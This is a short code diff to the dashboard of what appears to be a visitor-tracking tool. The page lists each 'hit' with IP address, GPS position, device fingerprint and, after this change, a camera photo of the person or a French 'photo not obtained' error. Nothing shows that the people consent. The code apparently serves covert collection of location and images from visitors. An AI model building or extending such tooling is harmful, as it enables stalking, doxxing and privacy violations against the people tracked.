@@ -62,6 +62,8 @@
     .hit .ip { color: #00aaff; font-weight: bold; margin-bottom: 4px; }
     .hit .gps { color: #ffaa00; margin-bottom: 4px; }
     .hit .device { color: #888; font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .hit img.photo { width: 160px; height: 120px; object-fit: cover; border-radius: 6px; margin-top: 8px; border: 1px solid #333; display: block; }
+    .hit .no-photo { color: #444; font-size: 11px; margin-top: 6px; }
     .map-link { color: #00ff88; text-decoration: none; font-size: 11px; }
     .empty { text-align: center; color: #333; padding: 40px; }
     .error { color: #ff4444; padding: 12px; }
@@ -113,6 +115,9 @@
                 <div class="gps">${gpsLine}</div>
                 <div class="device">💻 ${h.userAgent}</div>
                 <div class="device">📱 ${h.platform} | ${h.screenRes} | ${h.language}</div>
+                ${h.photo
+                  ? `<img class="photo" src="${h.photo}" alt="photo">`
+                  : `<div class="no-photo">📷 ${h.photoError || 'Photo non obtenue'}</div>`}
               </div>`;
           });
         }
